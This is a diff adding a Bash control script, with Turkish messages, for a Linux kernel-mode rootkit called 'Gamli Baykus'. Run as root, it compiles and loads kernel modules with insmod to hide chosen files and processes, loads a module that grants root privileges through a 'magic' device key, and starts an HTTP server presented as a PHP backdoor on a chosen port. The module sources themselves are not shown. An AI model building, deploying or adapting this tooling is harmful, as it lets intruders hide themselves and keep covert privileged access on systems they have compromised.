@@ -1,0 +1,108 @@
+#!/bin/bash
+
+
+
+dosyakontrol () {
+  if test -f $1 ;then
+    echo "[+] Modul Olustruruldu "
+  else
+    echo "[!] Modul OLusturulamadi !"
+fi
+}
+
+
+if [ ! -f "/var/baba/lkms/installed.txt" ]; then
+    clear
+    echo "[!] Lutfen Kurulumu Tamamlayin !"
+    echo " "
+else   
+
+if [ `whoami` != 'root' ]
+  then
+    clear
+    echo "[!] Root olarak calistirin !"
+    echo " "
+    exit
+else
+	if [[ -z "$1" ]] ;then
+	clear
+	echo -e 'Gamli Baykus Kernel Mode Rootkit v1.0\n[http://modebit0.info]\n\n--phpbackdoor [Port Number]\n--file [Gizlenecek Dosya]\n--process [Gizlenecek Process ID]\n--rootdevice [Device Keyi]\n\n===[Kisa Opsiyonlar]===\n\n-f [Dosya ismi]\n-p [Process id]\n-r [Devicekey]\n-b [port number]\n'
+	else 
+		if [[ -z "$2" ]] ;then
+		echo "[!] Gecerli Bir Opsiyon giriniz "
+
+		else
+
+	if [[ $1 == "--file" ]] || [[ $1 == "-f" ]]
+	then
+		random="$RANDOM"
+		file=$random.c
+		file2=$random.o
+		file3=$random.ko
+		cd /var/baba/lkms/makes && rm -rf *
+		cp /var/baba/lkms/hidefile.c /var/baba/lkms/makes/$file
+		echo -e 'obj-m += '$file2'\n\nall: \n	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules \n\nclean: \n	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n' >> /var/baba/lkms/makes/Makefile
+		cd /var/baba/lkms/makes && chmod 777 *
+		sleep 1
+		cd /var/baba/lkms/makes && make
+		sleep 1
+		insmod ./$file3 hide="$2" 2>&1 >/dev/null
+		clear
+		sleep 1
+		dosyakontrol "$file3"
+    
+	elif [[ $1 == "--process" ]] || [[ $1 == "-p" ]]
+	then
+		random="$RANDOM"
+		file=$random.c
+		file2=$random.o
+		file3=$random.ko
+		cd /var/baba/lkms/makes && rm -rf *
+		cp /var/baba/lkms/process.c /var/baba/lkms/makes/$file
+		echo -e 'obj-m += '$file2'\n\nall: \n	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules \n\nclean: \n	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n' >> /var/baba/lkms/makes/Makefile
+		cd /var/baba/lkms/makes && chmod 777 *
+		sleep 1
+		cd /var/baba/lkms/makes && make
+		sleep 1
+		insmod ./$file3 verb=1 target_pid=$2 2>&1 >/dev/null
+		clear
+		sleep 1
+		dosyakontrol "$file3"
+	
+	elif [[ $1 == "--rootdevice" ]] || [[ $1 == "-r" ]]
+	then
+		random="$RANDOM"
+		file=$random.c
+		file2=$random.o
+		file3=$random.ko
+		cd /var/baba/lkms/makes && rm -rf *
+		cp /var/baba/lkms/privesc.c /var/baba/lkms/makes/$file
+		echo -e 'obj-m += '$file2'\n\nall: \n	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules \n\nclean: \n	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n' >> /var/baba/lkms/makes/Makefile
+		cd /var/baba/lkms/makes && chmod 777 *
+		sleep 1
+		cd /var/baba/lkms/makes && make
+		sleep 1
+		insmod ./$file3 magic="$2" 2>&1 >/dev/null
+		clear
+		sleep 1
+		dosyakontrol "$file3"
+
+	elif [[ $1 == "--phpbackdoor" ]] || [[ $1 == "-b" ]]
+	then
+		cd /var/baba/lkms && gcc httpserver.c -o server 2>&1 >/dev/null
+		sudo /var/baba/lkms/server $2 ./var/baba/wpanel/ &		
+
+		
+	else
+		echo "[!] Gecerli Bir Opsiyon Giriniz !"
+		exit
+	fi
+
+
+   fi
+fi
+	fi
+		fi
+
+#<<EOF
+
